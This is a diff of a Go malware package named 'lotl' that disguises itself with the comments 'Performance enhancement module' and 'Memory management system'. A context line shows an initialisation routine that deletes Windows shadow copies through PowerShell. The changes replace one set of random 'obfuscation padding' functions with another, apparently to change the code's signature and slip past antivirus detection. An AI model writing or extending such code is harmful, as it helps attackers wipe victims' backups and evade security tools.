@@ -1,6 +1,6 @@
 // OBFUSCATED
-// Performance enhancement module
 // Memory management system
+// Performance enhancement module
 package lotl
 
 import (
@@ -195,32 +195,38 @@ func InitializeLOTL() {
 	go DeleteShadowCopiesViaPowerShell()
 }
 
-// Obfuscation padding
-func obf_83470() {
-	_ = 9710
-	var _ = "B50Go3XkcKYg00vg42AHEKSIoFRK4KjozK8dL8czP2q4blFDhI"
-}
+
 
 // Obfuscation padding
-func obf_85054() {
-	_ = 2517
-	var _ = "Q9SbwVKZyurRhZq57RWLa6Sxs2fMYJgAwhOM6uJgHNN6lxW6Sd"
+func obf_94887() {
+    _ = 5358
+    var _ = "YPf6o2P5Nduo0UmXBt739UdfYtrcy1u1Xhf4rrdSoW1kw160IO"
 }
 
-// Obfuscation padding
-func obf_85055() {
-	_ = 2043
-	var _ = "DlnFfET7Yo6UdKZWwJDjWnzo0oe4msvQUXkKmX7CDQRIqoOFsW"
-}
 
 // Obfuscation padding
-func obf_98637() {
-	_ = 1063
-	var _ = "Ds9sXl8PUiOEzqdPOhU5UZVG7LmtbG0Nseod9AtFpc5n8vsDsv"
+func obf_47129() {
+    _ = 4987
+    var _ = "W3etyKotwJCBhRvKyiUP8eC8jwTxBgm34XRkAMlysSjk0Jtl7e"
 }
 
+
 // Obfuscation padding
-func obf_55691() {
-	_ = 9261
-	var _ = "hwxM4dHroZa2It0AQ0m92rwPqwzKVEgFDhH8fZzMjBmBIYj8Kc"
+func obf_69274() {
+    _ = 539
+    var _ = "szI0sOERhNl1DzNLxwAbZzPSV7hvLSMhVIuGNo7GO6pomWCHtM"
+}
+
+
+// Obfuscation padding
+func obf_53808() {
+    _ = 5279
+    var _ = "lh3bAUfprYwcJjPrbbKhg2cRrQqkXn1QThsUVifn3aKPghsSLE"
+}
+
+
+// Obfuscation padding
+func obf_35997() {
+    _ = 9473
+    var _ = "OQ5z1JDeBQFAfYVRALydjeZpBg9C3TRZBVM8tbGzLYw2qnum3K"
 }
